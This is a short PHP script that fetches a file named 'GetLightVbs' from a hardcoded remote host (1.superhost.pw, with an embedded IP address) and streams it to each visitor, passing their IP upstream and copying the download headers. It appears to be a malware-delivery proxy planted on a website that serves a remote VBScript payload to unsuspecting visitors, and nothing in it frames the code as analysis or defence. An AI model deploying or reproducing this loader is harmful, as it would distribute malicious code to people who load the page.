<?php
ob_start();

function generateRandomString($length = 10) {
    return bin2hex(random_bytes($length / 2));
}

$randomString = generateRandomString();
$url = "http://1.superhost.pw/109.248.201.219/default/$randomString/none/GetLightVbs";

function getClientIp() {
    // Check if 'ip' parameter exists in the query string
    if (!empty($_GET['ip']) && filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
        return $_GET['ip'];
    }

    // Fallback to HTTP headers and server variables
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // HTTP_X_FORWARDED_FOR can contain multiple IPs, the first one is the real client IP
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function streamRemoteFile($url, $clientIp) {
    $ch = curl_init($url);
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Not recommended for production
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'HTTP_X_FORWARDED_FOR: ' . $clientIp
    ));

    $response = curl_exec($ch);
    
    if ($response === false) {
        echo 'cURL Error: ' . curl_error($ch);
        curl_close($ch);
        exit;
    }

    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $header_size);
    $body = substr($response, $header_size);
    
    curl_close($ch);

    foreach (explode("\r\n", $headers) as $header) {
        if (stripos($header, 'Content-Length:') === 0 || 
            stripos($header, 'Content-Type:') === 0 || 
            stripos($header, 'Content-Disposition:') === 0 ||
            stripos($header, 'Content-Encoding:') === 0) {
            header($header);
        }
    }

    echo $body;
}

$clientIp = getClientIp();
streamRemoteFile($url, $clientIp);

ob_end_flush();
?>
